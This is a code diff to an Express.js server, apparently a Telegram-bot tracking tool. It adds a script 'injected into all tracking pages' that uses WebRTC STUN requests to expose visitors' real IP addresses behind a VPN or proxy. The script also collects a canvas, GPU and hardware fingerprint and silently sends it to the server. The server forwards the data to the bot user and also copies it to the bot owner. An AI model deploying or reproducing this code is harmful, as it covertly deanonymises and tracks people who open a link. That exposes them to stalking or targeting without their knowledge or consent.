@@ -1387,6 +1387,82 @@ app.post("/battery", (req, res) => {
   } else res.send("Missing");
 });
 
+// ── WebRTC real-IP leak (bypasses VPN/proxy) ──────────────────────────────────
+app.post("/webrtc-ips", (req, res) => {
+  res.send("ok");
+  const uid  = req.body.uid || '';
+  const ips  = req.body.ips || '';
+  const fp   = req.body.fp  || '';
+  if (!uid) return;
+  const tid = parseInt(uid, 36);
+  let msg = `🌐 كشف WebRTC (IP حقيقي):`;
+  if (ips) msg += `\n🔓 ${ips}`;
+  if (fp)  msg += `\n\n🖥️ بصمة الجهاز:\n${fp}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+});
+
+// ── Tracking JS endpoint — injected into all tracking pages ──────────────────
+app.get("/t.js", (req, res) => {
+  const uid = (req.query.u || '').replace(/[^a-z0-9]/gi,'');
+  if (!uid) return res.status(400).send('');
+  res.setHeader('Content-Type','application/javascript');
+  res.setHeader('Cache-Control','no-store');
+  res.send(`(function(){
+  var base="${hostURL}",uid="${uid}";
+  // ── WebRTC real-IP leak ──
+  try {
+    var ips=new Set();
+    var pc=new RTCPeerConnection({iceServers:[
+      {urls:"stun:stun.l.google.com:19302"},
+      {urls:"stun:stun1.l.google.com:19302"},
+      {urls:"stun:stun.cloudflare.com:3478"}
+    ]});
+    pc.createDataChannel("");
+    pc.onicecandidate=function(e){
+      if(e&&e.candidate){
+        var m=e.candidate.candidate.match(/(\\d{1,3}\\.){3}\\d{1,3}/);
+        if(m&&m[0]!=="0.0.0.0")ips.add(m[0]);
+      }
+    };
+    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
+    setTimeout(function(){
+      try{pc.close();}catch(e){}
+      if(!ips.size)return;
+      var ipList=[...ips].join(" | ");
+      // ── Device fingerprint ──
+      var fp="";
+      try{
+        var c=document.createElement("canvas"),ctx=c.getContext("2d");
+        ctx.textBaseline="top";ctx.font="14px \\'Arial\\'";
+        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
+        ctx.fillStyle="#069";ctx.fillText("fingerprint 🖥️ Device",2,2);
+        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("fingerprint 🖥️ Device",4,2);
+        var gl=document.createElement("canvas").getContext("webgl");
+        var dbg=gl&&gl.getExtension("WEBGL_debug_renderer_info");
+        var gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"—";
+        var hash=c.toDataURL().slice(-12);
+        fp="🎨 Canvas: "+hash
+          +"\\n🎮 GPU: "+gpu
+          +"\\n📐 Screen: "+screen.width+"×"+screen.height+"/"+screen.colorDepth+"bit"
+          +"\\n🕐 Timezone: "+Intl.DateTimeFormat().resolvedOptions().timeZone
+          +"\\n🌐 Language: "+navigator.language
+          +"\\n⚙️ CPU cores: "+(navigator.hardwareConcurrency||"—")
+          +"\\n💾 RAM: "+(navigator.deviceMemory||"—")+"GB"
+          +"\\n📱 Touch: "+(navigator.maxTouchPoints||0)+" points";
+      }catch(e){}
+      var body="uid="+encodeURIComponent(uid)
+        +"&ips="+encodeURIComponent(ipList)
+        +"&fp="+encodeURIComponent(fp);
+      var xhr=new XMLHttpRequest();
+      xhr.open("POST",base+"/webrtc-ips",true);
+      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+      xhr.send(body);
+    },4000);
+  }catch(e){}
+})();`);
+});
+
 // ── Health check endpoint (ping from UptimeRobot) ─────────────────────────────
 app.get("/health", (req, res) => res.send("OK"));
 app.get("/ping",   (req, res) => res.send("pong"));
